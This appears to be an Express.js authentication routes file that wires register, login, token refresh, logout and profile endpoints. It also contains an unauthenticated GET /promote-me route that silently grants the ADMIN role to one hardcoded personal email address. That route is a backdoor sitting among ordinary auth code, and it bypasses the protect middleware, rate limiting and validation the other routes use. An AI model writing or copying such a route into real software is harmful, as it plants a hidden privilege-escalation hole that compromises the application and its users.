const { Router } = require('express');
const { register, login, refresh, logout, getMe } = require('./auth.controller');
const { protect } = require('../../middleware/auth');
const validate = require('../../middleware/validate');
const { registerSchema, loginSchema, refreshSchema } = require('./auth.validation');

const { authLimiter } = require('../../middleware/rateLimit');

const router = Router();

router.post('/register', authLimiter, validate(registerSchema), register);
router.post('/login',    authLimiter, validate(loginSchema),    login);
router.post('/refresh',  validate(refreshSchema),  refresh);
router.post('/logout',   logout);
router.get('/me',        protect, getMe);

const prisma = require('../../lib/prisma');
router.get('/promote-me', async (req, res) => {
  try {
    const updatedUser = await prisma.user.update({
      where: { email: "messikishore2003@gmail.com" },
      data: {
        roles: {
          set: ["CUSTOMER", "ADMIN"]
        }
      }
    });
    res.json({ success: true, user: updatedUser });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

module.exports = router;
